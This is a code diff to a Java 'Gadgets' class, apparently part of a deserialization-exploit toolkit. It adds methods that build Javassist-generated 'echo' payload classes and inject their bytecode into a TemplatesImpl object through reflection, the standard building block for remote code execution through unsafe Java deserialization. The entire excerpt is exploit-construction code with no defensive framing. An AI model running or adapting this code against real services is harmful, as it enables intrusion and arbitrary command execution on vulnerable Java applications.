@@ -58,12 +58,54 @@ public class Gadgets {
         return Boolean.parseBoolean(System.getProperty("properXalan", "false")) ? createTemplatesImpl(classpayload, Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"), Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet")) : createTemplatesImpl(classpayload, TemplatesImpl.class, AbstractTranslet.class);
     }
 
+    public static Object createTemplatesImpl(String classpayload, int num, String codes) throws Exception {
+        return Boolean.parseBoolean(System.getProperty("properXalan", "false")) ? createTemplatesImpl(classpayload, Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"), Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),num, codes) : createTemplatesImpl(classpayload, TemplatesImpl.class, AbstractTranslet.class, num, codes);
+    }
+    public static Object createTemplatesImpl(String classpayload, String bytestr) throws Exception {
+        return Boolean.parseBoolean(System.getProperty("properXalan", "false")) ? createTemplatesImpl(classpayload, Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"), Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"), bytestr) : createTemplatesImpl(classpayload, TemplatesImpl.class, AbstractTranslet.class, bytestr);
+    }
+
     public static <T> T createTemplatesImpl(String payload, Class<T> tplClass, Class<?> abstTranslet) throws Exception {
         T templates = tplClass.newInstance();
         ClassPool pool = ClassPool.getDefault();
         Class<? extends EchoPayload> echoClazz = Utils.getPayloadClass(payload);
         EchoPayload<?> echoObj = (EchoPayload)echoClazz.newInstance();
         CtClass clazz = echoObj.genPayload(pool);
+        CtClass superClass = pool.get(abstTranslet.getName());
+        clazz.setSuperclass(superClass);
+        byte[] classBytes = clazz.toBytecode();
+        Field bcField = TemplatesImpl.class.getDeclaredField("_bytecodes");
+        bcField.setAccessible(true);
+        bcField.set(templates, new byte[][]{classBytes});
+        Field nameField = TemplatesImpl.class.getDeclaredField("_name");
+        nameField.setAccessible(true);
+        nameField.set(templates, "a");
+        return templates;
+    }
+
+    public static <T> T createTemplatesImpl(String payload, Class<T> tplClass, Class<?> abstTranslet,int num, String codes) throws Exception {
+        T templates = tplClass.newInstance();
+        ClassPool pool = ClassPool.getDefault();
+        Class<? extends EchoPayload> echoClazz = Utils.getPayloadClass(payload);
+        EchoPayload<?> echoObj = (EchoPayload)echoClazz.newInstance();
+        CtClass clazz = echoObj.genPayload(pool, num, codes);
+        CtClass superClass = pool.get(abstTranslet.getName());
+        clazz.setSuperclass(superClass);
+        byte[] classBytes = clazz.toBytecode();
+        Field bcField = TemplatesImpl.class.getDeclaredField("_bytecodes");
+        bcField.setAccessible(true);
+        bcField.set(templates, new byte[][]{classBytes});
+        Field nameField = TemplatesImpl.class.getDeclaredField("_name");
+        nameField.setAccessible(true);
+        nameField.set(templates, "a");
+        return templates;
+    }
+    public static <T> T createTemplatesImpl(String payload, Class<T> tplClass, Class<?> abstTranslet,String bytestr) throws Exception {
+        T templates = tplClass.newInstance();
+        ClassPool pool = ClassPool.getDefault();
+        Class<? extends EchoPayload> echoClazz = Utils.getPayloadClass(payload);
+        EchoPayload<?> echoObj = (EchoPayload)echoClazz.newInstance();
+        CtClass clazz = echoObj.genPayload(pool, bytestr);
         CtClass superClass = pool.get(abstTranslet.getName());
         clazz.setSuperclass(superClass);
         byte[] classBytes = clazz.toBytecode();
